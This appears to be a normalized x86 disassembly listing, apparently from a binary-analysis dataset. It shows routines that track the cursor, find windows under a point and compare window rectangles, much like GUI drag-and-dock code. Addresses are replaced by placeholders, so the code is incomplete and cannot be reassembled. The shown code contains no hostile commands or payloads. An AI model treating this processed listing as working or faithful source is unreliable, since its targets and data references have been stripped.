push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434dcc
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_434fb0
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403490
pop edi
pop esi
pop ebp
retn 0x4
sub_434fd4
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_434ff8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_434fd4
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_434fd4
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4350b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_435120
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_435570
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43468c
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43df6c
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43df6c
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43df6c
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403490
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4350b4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43df6c
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43df6c
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_4352b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43df6c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43df6c
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4352fc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_434b14
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_435120
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_414170
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43df6c
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_4352b8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403490
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43ca9c
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_434a84
sub_435458
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4141cc
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_414060
mov edx edi
mov eax [ rw-data ]
call sub_414014
jmp r-xdata
sub_4354b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_435510
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404510
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_434658
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_435570
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_435510
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43559c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4352fc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_435570
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_4354b8
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43df6c
mov [ esi ] eax
sub_4355ec
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_4354b8
cmp eax 0x1
sbb eax eax
inc eax
sub_435628
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_43ca08
test eax eax
je r-xdata
mov eax esi
call sub_43ca08
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_436058
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_414170
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4141cc
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_43ca1c
mov edi eax
jmp r-xdata
sub_4356bc
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43559c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43f8a0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4355ec
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4355ec
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4372f0
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4355ec
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454db4
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_43f888
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_435628
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403490
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_43f988
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_43f8a0
jmp r-xdata
mov eax [ rw-data ]
call sub_43f9fc
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454db4
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4372f0
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403490
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403490
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407ca0
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43598c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_434bb8
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43f8a0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_4356bc
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_435afc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_435ca1
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403490
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403490
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434ec0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43598c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434da8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43df6c
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412ce0
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_4372c4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412ce0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_435cc0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403490
mov ebx eax
sub_435d34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_436000
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_435f8e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_434c00
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403444
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_435cc0
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4355ec
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_43f9fc
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f95
mov eax [ rw-data ]
call sub_403294
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44e0a8
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_438978
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_4354b8
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_451d14
sub_435f95
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403420
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
sub_436024
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43468c
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_436058
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_436024
